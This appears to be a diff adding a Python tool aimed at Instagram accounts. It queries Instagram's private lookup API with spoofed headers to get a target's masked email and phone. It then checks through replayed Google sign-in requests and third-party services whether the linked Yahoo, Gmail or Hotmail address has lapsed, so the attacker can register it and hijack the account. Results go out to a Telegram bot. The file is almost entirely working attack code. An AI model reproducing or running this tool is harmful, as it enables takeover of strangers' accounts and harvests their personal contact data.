@@ -1,0 +1,233 @@
+import requests,os,random
+import webbrowser
+from time import sleep
+user_agent = [
+    "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",'Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550)',
+    'Instagram 64.0.0.12.96 (iPhone8,1; iOS 12_0_1; pt_BR; pt-BR; scale=2.00; gamut=normal; 750x1334; 124976489)',
+    'Instagram 8.4.0 (iPhone7,2; iPhone OS 9_3_2; nb_NO; nb-NO; scale=2.00; 750x1334',
+    'Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)'
+]
+X=int(input("[?] With telegram ? \n[!] 0 = NO | 1 = YES\n+> "))
+if X == 1 :
+	try:
+		tok=input("[?] TOKEN : ")
+		ic=input("[?] ID : ")
+		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=HI\nIf you have a problem tell me\nINSTA : @DOOM.OLD| TELE : @ZXXXXZV")
+	except:
+		print("[!] Try with VPN ")
+		input("")
+		exit()
+else:
+	pass
+os.system('cls' if os.name == 'nt' else 'clear')#DOOM
+print("""\033[0;97mINSTA : DOOM.OLD – 968.OPS\n\033[1;34mIf you get a problem tell me in Instagram\nin » my instagram\nte » my telegram""")
+def ops ():
+	print('\n'+'\033[1;30m='*20+'\n')
+	user=input("\033[1;30m[\033[0;37m?\033[1;30m] username or url user : \033[0;37m")
+	if user == "in":
+		webbrowser.open("https://instagram.com/968.ops"),ops()
+	elif user == "te":
+		webbrowser.open("https://t.me/ZXXXXZV"),ops()
+	else:
+		pass
+	try:
+		user=user.split("/")[3]
+		user=user.split("?")[0] or user.split("/")[0]
+	except:
+		pass
+	url = "https://i.instagram.com:443/api/v1/users/lookup/"
+	cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
+	x=random.choice(user_agent)
+	headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
+           "Accept-Language": "ar-AE",
+           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+           "User-Agent": x,
+           "Accept-Encoding": "gzip, deflate"}
+	data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }
+	try:
+		re = requests.post(url, headers=headers, cookies=cookies, data=data)
+		if re.status_code == 200:
+			pass
+		elif "spam" in re.text:
+			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31spam - try with VPN")
+			ops()
+		elif "Please wait a few minutes before you try again." in re.text:
+			print("\033[1;31m[!] wait 5m")
+			print('\n'+'\033[1;30m='*20+'\n')
+			sleep(60*5)
+		elif '"message":"يرجى الانتظار لبضع دقائق قبل إعادة المحاولة.","status":"fail"' in re.text :
+			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31wait 5m")
+			print('\n'+'\033[1;30m='*20+'\n')
+			sleep(60*5)
+			ops()
+		elif '"message":"No users found","status":"fail"' in re.text :
+			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31No usere found")
+			print('\n'+'\033[1;30m='*20+'\n')
+			ops()
+		elif '{"message":"لم يتم العثور على مستخدمين","status":"fail"}'in re.text:
+			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31No usere found")
+			print('\n'+'\033[1;30m='*20+'\n')
+			ops()
+		else:
+			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31error")
+			print(re.text)
+			print(re.status_code)
+			ops()
+		info = re.json()
+	except:
+		print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31mthere is no Internet")
+		ops()
+	try:
+		print("\033[1;30m[\033[0;37m$\033[1;30m] Email :\033[1;32m "+info['obfuscated_email'])
+		m1=(user[0])
+		m2=(user[-1])
+		s=info["obfuscated_email"].split("@")[0]
+		m3=(s[0])
+		m4=(s[-1])
+		if m1 == m3 and m2 == m4:
+			v=0
+			if '@yahoo.com' in info["obfuscated_email"]:
+				req = requests.get("http://Xtools.PythonAnyWhere.Com/Yahoo/Ckeck?Email="+user+"@yahoo.com").text
+				if "Available"in req:
+					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
+					if "Linked Or Ban" in rm:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
+						eml=user+"@yahoo.com"
+					else:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+				else:
+					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+			elif '@gmail.com' in info["obfuscated_email"]:
+				g = {
+                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36',
+                "accept": "*/*",
+                "accept-language": "en-US,en;q=0.9",
+                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+                "google-accounts-xsrf": "1",
+                "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
+                "sec-ch-ua-mobile": "?0",
+                'cookie': '1P_JAR=2021-04-23-14; NID=214=CRMqF7HgO5zlqMjGI68ivlhhKYRFXDFDKgTLhoSPkdI8Jecep990dGuD79260jGLnlCOheVjN0DgOCZrgqtXlWTg8_oa3FRTkkl1R8T__AW_tP7tTf47v47LplSf06U69qtt1TYFheZlV5TY3y7z0WQ26M-cfW2K2dwWDWssBu4; __Host-GAPS=1:h2N7ZQmjkQC0gshtKnobg7PGnhEj:BLgKSq_IdwyFkJGX',
+                'google-accounts-xsrf': '1',
+                'origin': 'https://accounts.google.com',
+                'referer': 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin",
+                "x-chrome-id-consistency-request": "version=1,client_id=77185425430.apps.googleusercontent.com,device_id=85d9b9de-8d8c-42d5-a230-114dfd0e03d7,signin_mode=all_accounts,signout_mode=show_confirmation",
+                "x-client-data": "CI+2yQEIprbJAQjDtskBCKmdygEIlqzKAQj4x8oBCPPiygEI5JzLAQipncsBCKGgywEY4JrLAQ==",
+                "x-same-domain": "1"
+            }
+				a = 'https://accounts.google.com/_/lookup/accountlookup?hl=en&_reqid=53722&rt=j'
+				m = {
+              'continue': 'https://mail.google.com/mail/',
+              'service': 'mail',
+              'rip': '1',
+              'f.req': f'["{user}","AEThLlylGK7PENH73mXgNob6ajqd9joGStTDyZzZC8vpzyHSq1-qD1I7gX_jbfHX5Vigg3GbGcUUQUTX7SK4pLoWmvKA-savajyBc693Eb8_HELhP0cE8ivPO7AYyLomdSWBGNHqoeKdndakb-VtUx-8ykmu_geIpBUatAr5Cq9_3XtT07HxNoFy4UjzUe-P6nCotCPOh2uy",[],null,"US",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"7c575a4c-78ee-4096-afc7-0b3d57b2319f",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{user}",null,null,null,true,true,[]]',
+              'bgRequest': '["identifier","!7e6l7qPNAAbkP6l65D9C5VaW63X-KXc7ACkAIwj8Ru-r0524lKFLb-xzPvfs0luCWdWaorji8NDMEQrHiWunFdf--wIAAAEqUgAAACJoAQcKALmvfP3ooflnF0ePIC5Ot-bR6gHMRPxBN2dG7z_LYT60MWYmyfC0tvahmV38-_7BxDERrQeYZ5fDrAUx4j_E6Clx26l5ji93BKEiKagKkOQFE6-9OXwRjnt3cE97f3SdBS9_oaMrPPXlSHjOSzdZA8HzKr9l8B25ctfDB-0A-hZS9G0QYfyMTt_uhxFbMkYn6PKau7J2pSJ0up-Zn5_r19OUIRzPDjrciOIxatzWjSW1U2JpqsXo_EgriJkCuNyR6RtoVMpNwcrUbmTQDXHUiCOG_Hr41c7bcyuSA0EZgcs1Tcbn-QmE4PWeBPg6XMgq1kjjRzQBA2rlqPCa1_9JPSgPFRUb0Mo2nzHxCSfw46NXC-ZqUWU2PPUl33Y1KPZ4buw143QpNihaXx6mB-_GVmYc96oKDBtZhZc1msfIYtJMl-F2aQiLLVjs-SZIGhCd3-2gGbFu82dVWdQVyIGK4yvj6iCNU1xDEy3nZTOZF0IhKpkZrMjmkuvNV18UVOHUp7joKhiTQ8RXmVNnF-LshDKpLzmwCJyF3ucJTTdXI3mkvVRhgC9E8KY1_V9iigknqZa6FfbBVSQSJJKvUPf31rY-DVINOWGJOdHvqfolnHlJGJ0dd8gurzbVeGI7GAPRVEM_9wkPARcFqSuL-k-rWvUc_CXF-NtpNMGc9QLkT8owsavNtsyEfd5ZaLjDJVc-9Vb1Icbj-lAG93pc8neez3EUjgJKrpMhNqK3IYcogezQAqyW-5Up2RCu442FyTaNXgriSH_TkI-DcbGueY5cdqlq20fn_1W92PxE87598fHjyAf1qRNXu74Ccis76OIaU9M1b2TnoMC3AhCHcyCPXXZDAPdgA32iyMNUS7Nvf1rI64KC3cbjTldQIk5HSWbSH3E_NATMJa6cnyiib7Um-YyxlBpO_2jLZTLsXN2KmpXdMgYr7ZVOi89k_MsWQuhPRUsWs-GPNx1-1kbxlxuBVEa1FOI8kMaayDhGZEmYxxUHTmKrwlwddZUPbZJL8ROALOwfgePVV_apPW64m_zGWj7TAum6ZdbOXWVAljgdL3cVQyTpQoBCBEsqaBRCVYFLG-A3HcCVZH_uKBkt2t3NllYeDHlcfQFYxDh8ILbhvppObNFYGcIAcnH44goFoUd2XQ3_KCsVD8yCElmfWGRC6ZDTFn7vHg"]',
+              'azt': 'AFoagUVfIuWsv7QzhIm8DmX7onE82FjPvw:1619189712069',
+              'cookiesDisabled': 'false',
+              'deviceinfo': '[null,null,null,[],null,"US",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"7c575a4c-78ee-4096-afc7-0b3d57b2319f",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,0,null,false,null,""]',
+              'gmscoreversion': 'undefined',
+              'checkConnection': 'youtube:424:0',
+              'checkedDomains': 'youtube',
+              'pstMsg': '1',
+            }
+				gmail = requests.post(a , data=m, headers=g).text
+				if ('gf.alr",16') in gmail:
+					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@gmail.com").text
+					if "Linked Or Ban" in rm:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@gmail.com")
+					else:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+				else:
+					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+			elif "@hotmail.com" in info["obfuscated_email"]:
+				p=requests.get("http://tweakpy-filza.ueuo.com/api.php?email="+user+"@hotmail.com").text
+				if "False" in p:
+					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@hotmail.com").text
+					if "Linked Or Ban" in rm:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@hotmail.com")
+						eml=user+"@hotmail.com"
+					else:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+				else:
+					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+			elif "@g*****.com" in info["obfuscated_email"]:
+				g = {
+                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36',
+                "accept": "*/*",
+                "accept-language": "en-US,en;q=0.9",
+                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+                "google-accounts-xsrf": "1",
+                "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
+                "sec-ch-ua-mobile": "?0",
+                'cookie': '1P_JAR=2021-04-23-14; NID=214=CRMqF7HgO5zlqMjGI68ivlhhKYRFXDFDKgTLhoSPkdI8Jecep990dGuD79260jGLnlCOheVjN0DgOCZrgqtXlWTg8_oa3FRTkkl1R8T__AW_tP7tTf47v47LplSf06U69qtt1TYFheZlV5TY3y7z0WQ26M-cfW2K2dwWDWssBu4; __Host-GAPS=1:h2N7ZQmjkQC0gshtKnobg7PGnhEj:BLgKSq_IdwyFkJGX',
+                'google-accounts-xsrf': '1',
+                'origin': 'https://accounts.google.com',
+                'referer': 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin",
+                "x-chrome-id-consistency-request": "version=1,client_id=77185425430.apps.googleusercontent.com,device_id=85d9b9de-8d8c-42d5-a230-114dfd0e03d7,signin_mode=all_accounts,signout_mode=show_confirmation",
+                "x-client-data": "CI+2yQEIprbJAQjDtskBCKmdygEIlqzKAQj4x8oBCPPiygEI5JzLAQipncsBCKGgywEY4JrLAQ==",
+                "x-same-domain": "1"
+            }
+				a = 'https://accounts.google.com/_/lookup/accountlookup?hl=en&_reqid=53722&rt=j'
+				m = {
+              'continue': 'https://mail.google.com/mail/',
+              'service': 'mail',
+              'rip': '1',
+              'f.req': f'["{user}","AEThLlylGK7PENH73mXgNob6ajqd9joGStTDyZzZC8vpzyHSq1-qD1I7gX_jbfHX5Vigg3GbGcUUQUTX7SK4pLoWmvKA-savajyBc693Eb8_HELhP0cE8ivPO7AYyLomdSWBGNHqoeKdndakb-VtUx-8ykmu_geIpBUatAr5Cq9_3XtT07HxNoFy4UjzUe-P6nCotCPOh2uy",[],null,"US",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"7c575a4c-78ee-4096-afc7-0b3d57b2319f",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{user}",null,null,null,true,true,[]]',
+              'bgRequest': '["identifier","!7e6l7qPNAAbkP6l65D9C5VaW63X-KXc7ACkAIwj8Ru-r0524lKFLb-xzPvfs0luCWdWaorji8NDMEQrHiWunFdf--wIAAAEqUgAAACJoAQcKALmvfP3ooflnF0ePIC5Ot-bR6gHMRPxBN2dG7z_LYT60MWYmyfC0tvahmV38-_7BxDERrQeYZ5fDrAUx4j_E6Clx26l5ji93BKEiKagKkOQFE6-9OXwRjnt3cE97f3SdBS9_oaMrPPXlSHjOSzdZA8HzKr9l8B25ctfDB-0A-hZS9G0QYfyMTt_uhxFbMkYn6PKau7J2pSJ0up-Zn5_r19OUIRzPDjrciOIxatzWjSW1U2JpqsXo_EgriJkCuNyR6RtoVMpNwcrUbmTQDXHUiCOG_Hr41c7bcyuSA0EZgcs1Tcbn-QmE4PWeBPg6XMgq1kjjRzQBA2rlqPCa1_9JPSgPFRUb0Mo2nzHxCSfw46NXC-ZqUWU2PPUl33Y1KPZ4buw143QpNihaXx6mB-_GVmYc96oKDBtZhZc1msfIYtJMl-F2aQiLLVjs-SZIGhCd3-2gGbFu82dVWdQVyIGK4yvj6iCNU1xDEy3nZTOZF0IhKpkZrMjmkuvNV18UVOHUp7joKhiTQ8RXmVNnF-LshDKpLzmwCJyF3ucJTTdXI3mkvVRhgC9E8KY1_V9iigknqZa6FfbBVSQSJJKvUPf31rY-DVINOWGJOdHvqfolnHlJGJ0dd8gurzbVeGI7GAPRVEM_9wkPARcFqSuL-k-rWvUc_CXF-NtpNMGc9QLkT8owsavNtsyEfd5ZaLjDJVc-9Vb1Icbj-lAG93pc8neez3EUjgJKrpMhNqK3IYcogezQAqyW-5Up2RCu442FyTaNXgriSH_TkI-DcbGueY5cdqlq20fn_1W92PxE87598fHjyAf1qRNXu74Ccis76OIaU9M1b2TnoMC3AhCHcyCPXXZDAPdgA32iyMNUS7Nvf1rI64KC3cbjTldQIk5HSWbSH3E_NATMJa6cnyiib7Um-YyxlBpO_2jLZTLsXN2KmpXdMgYr7ZVOi89k_MsWQuhPRUsWs-GPNx1-1kbxlxuBVEa1FOI8kMaayDhGZEmYxxUHTmKrwlwddZUPbZJL8ROALOwfgePVV_apPW64m_zGWj7TAum6ZdbOXWVAljgdL3cVQyTpQoBCBEsqaBRCVYFLG-A3HcCVZH_uKBkt2t3NllYeDHlcfQFYxDh8ILbhvppObNFYGcIAcnH44goFoUd2XQ3_KCsVD8yCElmfWGRC6ZDTFn7vHg"]',
+              'azt': 'AFoagUVfIuWsv7QzhIm8DmX7onE82FjPvw:1619189712069',
+              'cookiesDisabled': 'false',
+              'deviceinfo': '[null,null,null,[],null,"US",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"7c575a4c-78ee-4096-afc7-0b3d57b2319f",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,0,null,false,null,""]',
+              'gmscoreversion': 'undefined',
+              'checkConnection': 'youtube:424:0',
+              'checkedDomains': 'youtube',
+              'pstMsg': '1',
+            }
+				gmail = requests.post(a , data=m, headers=g).text
+				if ('gf.alr",16') in gmail:
+					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@googlemail.com").text
+					if "Linked Or Ban" in rm:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@googlemail.com")
+						eml=user+"@googlemail.com"
+					else:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+				else:
+					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+			else:
+				print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+	except:
+		print("\033[1;30m[\033[0;37m$\033[1;30m] Email :\033[1;31m False"),ops()
+	try:
+		po=info['obfuscated_phone']
+		print("\033[1;30m[\033[0;37m$\033[1;30m] Phone number :\033[1;32m "+ po)
+	except:
+		print("\033[1;30m[\033[0;37m$\033[1;30m] Phone number : \033[1;31mFalse")
+		po="False"
+	try:
+		iid=info['user_id']
+		print(f"\033[1;30m[\033[0;37m$\033[1;30m] user id :\033[1;32m {iid}")
+	except:
+		print("\033[1;30m[\033[0;37m$\033[1;30m] user id : \033[1;31mFalse")
+	try:
+		uid=info['user_id']
+		x=requests.get(f"https://o7aa.pythonanywhere.com/?id={uid}").text
+		x1=str(x).split('"data": ')[1]
+		x2=str(x1).split(', "telegram":')[0]
+		print("\033[1;30m[\033[0;37m$\033[1;30m] data :\033[1;32m "+x2)
+	except:
+		print("\033[1;30m[\033[0;37m$\033[1;30m] data : \033[1;31mFalse ")
+	if X == 1:
+		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : @DOOM.OLD | TELE : @ZXXXXZV")
+	else:
+		pass
+	print('\n'+'\033[1;30m='*20+'\n')
+	ops()
+ops()
